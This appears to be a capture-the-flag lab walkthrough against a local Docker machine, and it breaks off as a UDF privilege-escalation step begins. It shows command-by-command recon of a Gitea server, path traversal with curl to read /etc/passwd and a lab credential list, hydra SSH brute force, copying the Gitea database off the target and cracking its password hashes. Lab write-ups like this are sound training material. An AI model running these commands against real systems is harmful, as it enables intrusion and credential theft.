# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.181 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.044 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1057ms
rtt min/avg/max/mdev = 0.044/0.112/0.181/0.068 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 14:37 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: B6:8E:4D:64:E6:DE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```
``` bash
sudo nmap -p22,80,3000 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 14:37 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
|_  256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: DaCapoDocs
|_http-server-header: Apache/2.4.58 (Ubuntu)
3000/tcp open  http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=397250cd9b38a4c0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=TNYNMmcDeu1jVBR8yPvxi9VJMEw6MTc5MTk5OTQ3NDM0MzYzMTQ5OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 14 Oct 2026 17:37:54 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=bd9d6f66a776478a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=zz2AIR1faS4Zez2jAHFlYab1rTY6MTc5MTk5OTQ3NDM2NTMxOTc1MQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 14 Oct 2026 17:37:54 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=10/14%Time=6ACFBDF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,37EE,"HTTP/1\.0\x20200\x20OK\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
SF:=397250cd9b38a4c0;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20_csrf=TNYNMmcDeu1jVBR8yPvxi9VJMEw6MTc5MTk5OTQ3NDM0MzYzMTQ5OQ;\x20
SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
SF:ns:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2014\x20Oct\x202026\x2017:37:54\x20
SF:GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20data-theme=\"
SF:gitea-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=
SF:device-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20
SF:a\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"da
SF:ta:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9m
SF:IHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3R
SF:hcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbn
SF:MiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0c
SF:y9pbWcvbG9nby5wbm")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet
SF:-Cookie:\x20i_like_gitea=bd9d6f66a776478a;\x20Path=/;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20_csrf=zz2AIR1faS4Zez2jAHFlYab1rTY6MTc5MTk
SF:5OTQ3NDM2NTMxOTc1MQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameS
SF:ite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2014\x20Oct
SF:\x202026\x2017:37:54\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est");
MAC Address: B6:8E:4D:64:E6:DE (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds
```
# Web enumeration
``` bash
whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.6.3], Script[text/javascript], Title[DaCapoDocs]
```
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 13615]
assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
# Gitea
On port 3000 is running a gitea service
``` bash
curl -s http://172.17.0.2:3000 | grep appUrl
appUrl: 'http:\/\/admin.s3cr3tdir.dev.gitea.dl\/',
```
``` bash
head -n 4 /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali.lab

172.17.0.2      admin.s3cr3tdir.dev.gitea.dl s3cr3tdir.dev.gitea.dl dev.gitea.dl gitea.dl
```
Create an account and found 3 repos and 2 users: **designer** and **admin**
## Repositories
``` bash
git clone http://admin.s3cr3tdir.dev.gitea.dl/designer/giteaInfo
Cloning into 'giteaInfo'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.

git clone http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp
Cloning into 'myapp'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (19/19), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 19 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (19/19), 6.26 KiB | 6.26 MiB/s, done.
Resolving deltas: 100% (2/2), done.

git clone http://admin.s3cr3tdir.dev.gitea.dl/designer/mysql
Cloning into 'mysql'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
```
### giteaInfo
``` bash
cat gitea_composed.xml
<?xml version="1.0" encoding="UTF-8"?>
<gitea>
    <service>
        <name>gitea</name>
        <image>gitea/gitea:latest</image>
        <ports>
            <port>3000:3000</port>
            <port>222:22</port>
        </ports>
        <volumes>
            <volume>/home/designer/gitea:/data</volume>
            <volume>/home/designer/gitea:/data/info.txt</volume>
            <volume>/opt/"INFO_FILE"</volume>
        </volumes>
        <environment>
            <variable name="GITEA__database__DB_TYPE">sqlite3</variable>
            <variable name="GITEA__database__PATH">/data/gitea.db</variable>
        </environment>
        <restart>always</restart>
    </service>
</gitea>
```
**designer** is a system user because of /home/designer
### mysql
``` bash
cat mysql_composer.xml
<docker-compose>
  <version>3.1</version>
  <services>
    <service>
      <name>mysql</name>
      <image>mysql:5.7</image>
      <container_name>mysql-container</container_name>
      <environment>
        <MYSQL_ROOT_PASSWORD>root123</MYSQL_ROOT_PASSWORD>
        <MYSQL_DATABASE>gitea</MYSQL_DATABASE>
        <MYSQL_USER>designer</MYSQL_USER>
        <MYSQL_PASSWORD>designer123</MYSQL_PASSWORD>
      </environment>
      <ports>
        <port>3306:3306</port>
      </ports>
      <volumes>
        <volume>mysql_data:/var/lib/mysql</volume>
      </volumes>
      <restart>always</restart>
    </service>
  </services>
  <volumes>
    <volume>
      <name>mysql_data</name>
    </volume>
  </volumes>
</docker-compose>
```
### myapp
``` bash
cat uwsgi.ini
[uwsgi]
module = app:app
master = true
processes = 4
socket = /var/www/gitea.dl/app/uwsgi.sock
chmod-socket = 660
vacuum = true
die-on-term = true
```
``` bash
git diff HEAD 4fcdf48692f3dc1201452af62e24dc0a1ea3f6c7
diff --git a/app.py b/app.py
index 99025ae..91fe77c 100755
--- a/app.py
+++ b/app.py
@@ -34,12 +34,13 @@ def index():

 @app.route("/download", methods=["GET"])
 def download():
-    filename = request.args.get("filename")
+    filename = request.args.get("filename")  # Se obtiene de la URL

     if not filename:
         flash("Se requiere un nombre de archivo", "danger")
         return redirect(url_for("index"))

+    # **Vulnerabilidad**: No se valida el path, permitiendo Path Traversal
     file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

     if os.path.exists(file_path):
```
As the comment says the app running in port 80 has a *path traversal* vulnerability
# Path traversal
## Dir fuzzing
``` bash
gobuster dir -u http://admin.s3cr3tdir.dev.gitea.dl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.s3cr3tdir.dev.gitea.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 200) [Size: 19848]
issues               (Status: 303) [Size: 38] [--> /user/login]
v2                   (Status: 401) [Size: 50]
hacker               (Status: 200) [Size: 19865]
explore              (Status: 303) [Size: 41] [--> /explore/repos]
designer             (Status: 200) [Size: 27638]
milestones           (Status: 303) [Size: 38] [--> /user/login]
notifications        (Status: 303) [Size: 38] [--> /user/login]
server-status        (Status: 403) [Size: 293]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
gobuster dir -u http://s3cr3tdir.dev.gitea.dl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3cr3tdir.dev.gitea.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 13374]
assets               (Status: 301) [Size: 333] [--> http://s3cr3tdir.dev.gitea.dl/assets/]
tutorials.html       (Status: 200) [Size: 6808]
free.html            (Status: 200) [Size: 7958]
css                  (Status: 301) [Size: 330] [--> http://s3cr3tdir.dev.gitea.dl/css/]
js                   (Status: 301) [Size: 329] [--> http://s3cr3tdir.dev.gitea.dl/js/]
javascript           (Status: 301) [Size: 337] [--> http://s3cr3tdir.dev.gitea.dl/javascript/]
premium.html         (Status: 200) [Size: 10166]
fonts                (Status: 301) [Size: 332] [--> http://s3cr3tdir.dev.gitea.dl/fonts/]
server-status        (Status: 403) [Size: 287]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
gobuster dir -u http://dev.gitea.dl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.gitea.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
search               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/search/]
about.html           (Status: 200) [Size: 123571]
contact.html         (Status: 200) [Size: 49689]
index.html           (Status: 200) [Size: 265382]
signup.html          (Status: 200) [Size: 53916]
assets               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/assets/]
src                  (Status: 301) [Size: 310] [--> http://dev.gitea.dl/src/]
pricing.html         (Status: 200) [Size: 49178]
javascript           (Status: 301) [Size: 317] [--> http://dev.gitea.dl/javascript/]
signin.html          (Status: 200) [Size: 53297]
404.html             (Status: 200) [Size: 84362]
server-status        (Status: 403) [Size: 277]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
gobuster dir -u http://gitea.dl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gitea.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
download             (Status: 302) [Size: 189] [--> /]
server-status        (Status: 403) [Size: 273]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
curl -X GET -s http://gitea.dl/download?filename=/etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
designer:x:1001:1001::/home/designer:/bin/bash
```
``` bash
curl -X GET -s http://gitea.dl/download?filename=/opt/info.txt
user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
user011:RootMePls$5 - Daniel dejó su servidor expuesto y no tardó en notar actividad sospechosa.
user012:SuperSecure*78 - Alejandra se enorgullecía de su conocimiento en seguridad, pero un descuido le costó caro.
user013:HelloWorld#91 - A Roberto le gustaba la programación y decidió usar un clásico como su clave.
user014:LetMeInNow!! - Diego estaba cansado de recordar claves complejas y optó por algo simple.
user015:TrickyPass66 - Una red social filtró su contraseña y pronto la vio expuesta en la web.
user016:UnsafeButFun$$ - Joaquín se divertía rompiendo su propia seguridad, pero un día fue víctima de su propio juego.
user017:HackThis!@3 - Beatriz creó su contraseña en modo irónico, pero los atacantes no lo tomaron como broma.
user018:SuperSecurePassword123 - Los hackers más novatos pensaban que usar lenguaje leet era seguro. No lo era.
user019:JustAnotherKey99 - Nadie pensaría en usar una clave tan genérica... excepto miles de personas.
user020:TryGuessMe#22 - Un pentester descubrió la clave en segundos y le envió un mensaje a su dueño.
user021:SimplePass88! - Isabel nunca imaginó que alguien intentaría adivinar su contraseña.
user022:HiddenSecret!2 - Aún después de cambiar su clave, Luis no podía quitarse la sensación de inseguridad.
user023:CrazyCodePass@ - Un desarrollador decidió probar una contraseña al azar... y olvidarla al día siguiente.
user024:SneakyKey99$ - Los ataques de diccionario estaban de moda, y Pablo decidió cambiar su clave.
user025:Password@Vault - Un gestor de contraseñas podría haber ayudado a Ricardo, pero prefirió confiar en su memoria.
user026:EliteHacker#77 - Creer que una contraseña es segura solo por tener símbolos es un error común.
user027:FortKnoxPass!! - Ignacio aprendió por las malas que no existe una seguridad infalible.
user028:IronWall!99 - La clave era sólida, pero un descuido con su correo llevó a una filtración.
user029:UltraHidden#32 - A pesar del nombre, la contraseña de Javier no era tan oculta.
user030:GodModeActive! - Mariana sintió que tenía el control, hasta que recibió una alerta de acceso sospechoso.
user031:MasterKey$66 - Un viejo truco de seguridad le falló a Fernando en el peor momento.
user032:NoOneCanSeeMe! - La privacidad era esencial para Esteban, pero alguien siempre estaba mirando.
user033:LockedSafe#12 - Una contraseña compleja no sirve si la guardas en un documento sin cifrar.
user034:MyLittleSecret@ - El diario de Valeria contenía muchos secretos, incluida su clave más preciada.
user035:BigBossKey!! - Alfonso era el administrador del sistema, pero un error le costó el acceso.
user036:DigitalFortress$ - Inspirado en su novela favorita, Tomás creó una clave única... o eso creía.
user037:PasswordBank#9 - Usar la misma clave para todo fue la peor decisión de Gabriel.
user038:YouShallNotPass! - El homenaje a Gandalf no protegió a Enrique de un ataque automatizado.
user039:NotSoObvious99 - Era una contraseña "no tan obvia", hasta que apareció en una filtración.
user040:SecretStash@12 - Emilia guardaba sus contraseñas en un archivo llamado "Seguridad.txt". Mala idea.
user041:AnonymousPass$ - Creyó que su clave era anónima, pero los registros contaban otra historia.
user042:BlackHatKey!77 - Aprender hacking ético le ayudó a darse cuenta de sus propias vulnerabilidades.
user043:RedTeamAccess# - Un pentest interno reveló que la seguridad de la empresa era más frágil de lo que pensaban.
user044:PrivilegedUser@ - Tener privilegios de administrador no te hace inmune a ataques.
user045:HiddenVault$$ - Un sistema de almacenamiento cifrado no sirve si la clave es demasiado simple.
user046:EncryptionKing! - Amante del cifrado, Samuel pensó que su clave era invulnerable. No lo era.
user047:DecryptedEasy# - Un día descubrió que su clave había sido descifrada con facilidad.
user048:BypassMePlz!! - Quiso jugar con la seguridad y terminó perdiendo el acceso.
user049:SuperHiddenKey@ - Creyó que su contraseña nunca sería descubierta... hasta que lo fue.
user050:CyberGuardian99! - La ciberseguridad no es solo cuestión de contraseñas fuertes, sino de hábitos seguros.
```
``` bash
curl -X GET -s http://gitea.dl/download?filename=/opt/info.txt | tr ':' ' ' | awk '{ print $2 }' > pass.txt
```
# SSH
## Brute force
``` bash
hydra -l designer -P pass.txt ssh://172.17.0.2 -f -V -t 64
[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
```
## Initial access
``` bash
ssh designer@172.17.0.2
```
``` bash
cat user.txt
4683f3b0c2f083bb9588370c0f8ab284
```
# Privilege escalation
## mysql docker container
In the previous enumeration in gitea found a docker container running a mysql instance on port 3306
``` bash
ss -tuln | grep 3306
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
```
``` bash
 mysql -u root -p
Enter password:
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
mysql -u designer -p
Enter password:
ERROR 1045 (28000): Access denied for user 'designer'@'localhost' (using password: YES)
```
## gitea db
``` bash
cd gitea/data/ && python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
```
``` bash
wget http://172.17.0.2:5000/gitea.db
--2026-10-14 21:52:12--  http://172.17.0.2:5000/gitea.db
Connecting to 172.17.0.2:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2097152 (2.0M) [application/octet-stream]
Saving to: ‘gitea.db’

gitea.db                                                      100%[================================================================================================================================================>]   2.00M  --.-KB/s    in 0.008s

2026-10-14 21:52:12 (265 MB/s) - ‘gitea.db’ saved [2097152/2097152]
```
``` bash
sqlite3 gitea.db
```
``` bash
sqlite> .tables
access                action_schedule_spec   branch                  email_hash              issue_index       mirror                      package_cleanup_rule   pull_auto_merge       repo_topic      system_setting   upload                webhook
access_token          action_task            collaboration           external_login_user     issue_label       notice                      package_file           pull_request          repo_transfer   task             user
action                action_task_output     comment                 follow                  issue_user        notification                package_property       push_mirror           repo_unit       team             user_badge
action_artifact       action_task_step       commit_status           gpg_key                 issue_watch       oauth2_application          package_version        reaction              repository      team_invite      user_blocking
action_run            action_tasks_version   commit_status_index     gpg_key_import          label             oauth2_authorization_code   project                release               review          team_repo        user_open_id
action_run_index      action_variable        commit_status_summary   hook_task               language_stat     oauth2_grant                project_board          renamed_branch        review_state    team_unit        user_redirect
action_run_job        app_state              dbfs_data               issue                   lfs_lock          org_user                    project_issue          repo_archiver         secret          team_user        user_setting
action_runner         attachment             dbfs_meta               issue_assignees         lfs_meta_object   package                     protected_branch       repo_indexer_status   session         topic            version
action_runner_token   auth_token             deploy_key              issue_content_history   login_source      package_blob                protected_tag          repo_license          star            tracked_time     watch
action_schedule       badge                  email_address           issue_dependency        milestone         package_blob_upload         public_key             repo_redirect         stopwatch       two_factor       webauthn_credential
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` INTEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `description` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibility` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_restricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organization` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAULT 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);
```
``` bash
sqlite> select name, passwd, salt, passwd_hash_algo from user;
╭──────────┬──────────────────────────────────────────────────────────────────────────────────────────────────────┬──────────────────────────────────┬──────────────────╮
│   name   │                                                passwd                                                │               salt               │ passwd_hash_algo │
╞══════════╪══════════════════════════════════════════════════════════════════════════════════════════════════════╪══════════════════════════════════╪══════════════════╡
│ admin    │ fc04cba67171e27d5260194a7d32bc6cba9adab13d2411fbf7e4b062d46a272b766e83c023143e6e458165490484acd5d1af │ b4b991c04bc1b2a525b7f4cfaabd5116 │ pbkdf2$50000$50  │
│ designer │ 9f2731da2383dba65973f46931bb2c31e437536b6af5e25c3cec7905c021e81441204a238fbb555bbd7006e6d5936d0437f6 │ 0fac92d70bd1a7992f3ef9365c88e962 │ pbkdf2$50000$50  │
│ hacker   │ 1d0c384e52bd95dd27a18625d3f78d62687ed9c5ae96d80d3fe2ce5cd3490385d8cd56a9b45485e4303c2e87231257d87c6a │ 8caf20999082bfc3b9d1e79dcb88a431 │ pbkdf2$50000$50  │
╰──────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────┴──────────────────────────────────┴──────────────────╯
```
The attribute *passwd_hash_algo* indicates very important things about the hash
The algorithm is **PBKDF2-HMAC-SHA256** configured with **50000** iterations and a hash length of **50** bytes
## Crack the hash
Using the tool **gitea2john** from [john](https://github.com/openwall/john/blob/bleeding-jumbo/run/gitea2john.py) and then manually removing the padding *=* of the base64 encoded hashes and salts
``` bash
cat hashes.txt
admin:$pbkdf2-sha256$50000$tLmRwEvBsqUlt/TPqr1RFg$/ATLpnFx4n1SYBlKfTK8bLqa2rE9JBH79+SwYtRqJys
designer:$pbkdf2-sha256$50000$D6yS1wvRp5kvPvk2XIjpYg$nycx2iOD26ZZc/RpMbssMeQ3U2tq9eJcPOx5BcAh6BQ
```
``` bash
john --format=PBKDF2-HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 50000 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Session aborted
```
couldn't crack the hash
## Exposed credentials
Previously in the dir fuzzing found a login panel in http://gitea.dl which placeholder says **PassAdmin123-**
``` bash
mysql -u admin -p
```
These credentials proved to be valid
## User defined functions (UDF)
``` bash
MariaDB [(none)]> show grants;
+------------------------------------------------------------------------------------------------------------------------------------------------+
